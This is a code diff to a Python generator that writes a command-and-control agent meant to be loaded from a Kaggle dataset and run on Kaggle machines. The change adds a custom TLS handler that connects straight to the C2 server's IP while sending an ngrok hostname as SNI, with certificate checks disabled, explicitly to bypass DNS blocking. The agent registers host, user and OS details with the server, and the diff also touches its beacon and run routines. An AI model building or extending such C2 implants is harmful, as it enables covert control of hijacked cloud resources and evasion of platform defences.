@@ -114,21 +114,41 @@ def create_dataset_with_machines(
             log_fn(f"[DATASET] DNS failed, using fallback IP: {c2_ip}")
         
         agent_code = f'''#!/usr/bin/env python3
-"""C2 Agent - loaded from Kaggle dataset (no DNS needed)"""
+"""C2 Agent - uses SNI hostname with IP to bypass DNS blocking"""
 import os,sys,json,time,socket,platform,subprocess,uuid,ssl
 from urllib.request import Request,urlopen,HTTPSHandler,build_opener
 from urllib.error import URLError
 
-# Use IP address to bypass DNS blocking
+# Use IP address with SNI hostname for ngrok
 C2_HOST='{c2_host}'
 C2_IP='{c2_ip}'
 AGENT_ID=str(uuid.uuid4())
 
 def http_post(path,data):
-    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+    # Create SSL context with SNI hostname
+    ctx=ssl.create_default_context()
+    ctx.check_hostname=False
+    ctx.verify_mode=ssl.CERT_NONE
+    
+    # Create custom HTTPS handler with SNI
+    class SNIHTTPSHandler(HTTPSHandler):
+        def https_open(self, req):
+            # Use IP address but set SNI hostname
+            return self.do_open(self._connection_factory, req)
+        
+        def _connection_factory(self, host, port, timeout=15):
+            # Connect to IP but send SNI hostname
+            sock = socket.create_connection((C2_IP, 443), timeout=timeout)
+            ctx_wrap = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            ctx_wrap.check_hostname = False
+            ctx_wrap.verify_mode = ssl.CERT_NONE
+            ssock = ctx_wrap.wrap_socket(sock, server_hostname=C2_HOST)
+            return ssock
+    
     url=f'https://{{C2_IP}}{{path}}'
     req=Request(url,data=json.dumps(data).encode(),headers={{'Content-Type':'application/json','User-Agent':'Mozilla/5.0','Host':C2_HOST,'ngrok-skip-browser-warning':'true'}})
-    return json.loads(build_opener(HTTPSHandler(context=ctx)).open(req,timeout=15).read())
+    opener = build_opener(SNIHTTPSHandler(context=ctx))
+    return json.loads(opener.open(req,timeout=15).read())
 
 def register():
     info={{'id':AGENT_ID,'hostname':f'kaggle-{{socket.gethostname()}}','username':os.environ.get('USER','kaggle'),'os':f'Kaggle {{platform.system()}}','arch':platform.machine(),'platform_type':'kaggle'}}
@@ -139,7 +159,7 @@ def beacon():
 
 def run():
     print(f'[C2] Agent {{AGENT_ID[:8]}}... starting')
-    print(f'[C2] Connecting via IP: {{C2_IP}} (Host: {{C2_HOST}})')
+    print(f'[C2] Connecting via IP: {{C2_IP}} with SNI: {{C2_HOST}}')
     try:
         r=register()
         print(f'[C2] Registered: {{r}}')
